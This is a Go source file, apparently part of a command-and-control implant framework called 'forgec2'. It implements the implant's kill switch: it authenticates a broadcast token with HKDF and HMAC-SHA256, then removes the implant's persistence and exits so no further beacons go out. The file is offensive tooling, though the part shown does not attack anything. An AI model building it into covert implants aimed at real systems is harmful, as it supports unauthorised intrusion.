//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"log"
	"os"
)

// kill-switch derivation parameters — MUST mirror internal/crypto/keys.go
// (see agent_killswitch_test.go for the byte-for-byte cross-check).
const (
	killSwitchSalt = "forgec2-killswitch-v1"
	killSwitchInfo = "killswitch"
)

// verifyKillSwitch checks the fleet kill-switch broadcast included in a beacon
// response. tokenHex is the per-arm token and macHex its per-implant
// authentication tag; both are only produced by the server holding this
// implant's registration key, so a forged or replayed broadcast never matches.
func verifyKillSwitch(tokenHex, macHex string) bool {
	if agentRegKey == nil || tokenHex == "" || macHex == "" {
		return false
	}
	ksKey := hkdfSHA256(agentRegKey, []byte(killSwitchSalt), []byte(killSwitchInfo))
	if len(ksKey) == 0 {
		return false
	}
	token, err := hex.DecodeString(tokenHex)
	if err != nil || len(token) == 0 {
		return false
	}
	got, err := hex.DecodeString(macHex)
	if err != nil || len(got) != 32 {
		return false
	}
	mac := hmac.New(sha256.New, ksKey)
	mac.Write(token)
	return hmac.Equal(mac.Sum(nil), got)
}

// engageKillSwitch tears the implant down: remove persistence/artifacts, then
// exit hard so no more beacons are ever sent.
func engageKillSwitch() {
	if Debug {
		log.Printf("[!] KILL SWITCH engaged — wiping implant")
	}
	if _, err := uninstallSelf(); err != nil && Debug {
		log.Printf("[!] uninstallSelf: %v", err)
	}
	os.Exit(1)
}
